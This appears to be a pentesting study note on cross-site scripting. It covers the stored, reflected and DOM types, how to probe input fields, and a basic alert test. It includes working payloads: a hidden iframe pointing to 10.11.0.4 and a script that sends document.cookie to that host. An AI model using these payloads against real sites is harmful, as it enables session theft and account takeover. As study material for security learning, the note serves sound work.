# XSS

**Stored XSS:** 
Stored in a database or cached by server. Usually in comments section or product reviews. Affects all users.  

**Reflected XSS:** Payload in a link or or crafted request. Affects targetted user submitting request or viewing link. Occurs in search fields and results, as well as anywhere user input is included in error messages.

**DOM XSS:** Difficult to detect from server side tools. Works by modifying the DOM environment in the victim’s browser used by the original client side script, so that the client side code runs in an unexpected manner.
Occurs when a browser parses the page’s content and inserted JavaScript is executed.

### How to identify
Browse the page and check for input. Then insert special chars and see if any return unfiltered.
	Common chars: `<>'"{};`
	
Html Encoding: `&lt;` is the character reference for `<` . If we can inject these into the page, browser wil treat them as elements.


### Basic XSS
Submit js-specific chars to see if they're removed or encoded.
Basic Test:  `<script>alert('XSS')</script>`


**Content Injection**  
Redirect a client by attaching an iframe, we can open a listener on port 80 and have the client connect to us.
```
<iframe	src=http://10.11.0.4/report	height=”0”	width=”0”></iframe>	
```

**Stealing cookies and Session Info**
The Secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in cleartext and captured over the network. 

The HttpOnly flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

Payload: `<script>new	Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>`
Js reads the cookie value and appends it to an image url. Browser reads the tag and sends a request to our server with the cookie in the query